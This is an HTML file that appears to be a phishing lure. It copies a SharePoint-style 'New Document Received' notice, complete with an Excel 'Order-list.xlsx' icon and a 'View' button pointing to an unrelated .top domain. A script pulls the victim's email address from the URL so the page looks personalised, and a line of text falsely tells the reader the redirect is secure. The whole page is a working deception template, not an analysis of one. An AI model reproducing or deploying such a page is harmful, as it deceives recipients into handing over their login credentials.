<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>New Document Received</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f7f7f7;
        }

        h1 {
            color: #333;
            font-size: 24px;
            font-weight: bold;
        }

        p {
            color: #666;
            font-size: 18px;
        }

        .button {
            background-color: #0078d4; /* SharePoint blue */
            border: none;
            color: white;
            padding: 15px 32px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 10px 2px;
            cursor: pointer;
            border-radius: 5px;
        }

        .button:hover {
            background-color: #005a8b; /* Darker blue */
        }

        .email-address {
            font-weight: bold;
            color: #0078d4;
        }

        .small-text {
            font-size: 14px; /* Smaller font size */
            color: #777;
        }

        .file-info {
            display: inline-flex;
            align-items: center;
            font-size: 18px;
            margin-top: 20px;
        }

        .file-info img {
            margin-right: 10px;
        }

    </style>
</head>
<body>

    <!-- Main Content -->
    <h1>New Document Received</h1>

    <p>Hello, <span id="user-email" class="email-address">[email]</span></p>

    <p>You have received a new document (Order list) from one of your contacts.</p>

    <!-- Excel File Info Section -->
    <div class="file-info">
        <!-- .xlsx Icon -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/f3/.xlsx_icon.svg" alt="Excel Icon" width="30" height="30">
        <!-- File name -->
        <span>Order-list.xlsx</span>
    </div>

    <!-- View Button -->
    <a href="https://ke-lington-group.top/order-list" class="button" target="_blank">View</a>

    <!-- Smaller Text Explanation -->
    <p class="small-text">This link will redirect you to view the document securely.</p>

    <!-- JavaScript to dynamically show the user's email -->
    <script>
        // Function to get the 'email' query parameter from the URL
        function getEmailFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('email'); // Get 'email' parameter
        }

        // Set the email in the span
        const email = getEmailFromURL();
        if (email) {
            document.getElementById('user-email').textContent = email;
        } else {
            document.getElementById('user-email').textContent = "Recipient Email Not Provided";
        }
    </script>

</body>
</html>
